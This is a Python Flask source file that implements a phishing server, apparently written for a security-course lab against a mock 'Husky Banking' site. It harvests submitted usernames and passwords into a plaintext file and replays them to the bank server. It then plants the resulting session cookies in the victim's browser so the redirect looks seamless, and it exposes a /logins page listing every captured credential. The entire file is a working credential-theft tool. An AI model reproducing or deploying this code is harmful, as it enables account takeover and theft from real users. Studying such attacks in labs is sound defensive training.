import requests
from pathlib import Path
from flask import Flask, request, redirect, make_response, url_for, render_template

app = Flask(__name__)

PHISHED_LOGINS = Path("phished_logins.txt")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET": 
        return render_template("index.html", login_failed=False)

    username = request.form["username"]
    password = request.form["password"]
    payload = {"username": username, "password": password, "submit": "submit"}

    with open(PHISHED_LOGINS, "a") as f:
        f.write(f"{username} {password}\n")

    # Log in to Husky Banking.
    session = requests.Session()
    response = session.post("http://10.13.4.80:80", data=payload)
    if not (f"You Logged In as {username}!!" in response.text):
        return render_template("index.html", login_failed=True)
    
    # Redirect the user to Husky Banking. Add auth cookies to be logged in.
    flask_response = make_response(redirect("http://127.0.0.1:8080"))
    for cookie in session.cookies:
        flask_response.set_cookie(cookie.name, cookie.value)
    return flask_response

@app.route("/logins")
def logins():
    if PHISHED_LOGINS.exists():
        with open(PHISHED_LOGINS, "r") as f:
            logins = f.read().split("\n")[:-1]
    else:
        logins = []
    return "<br>".join(logins)


if __name__ == "__main__":
    app.run(debug=True)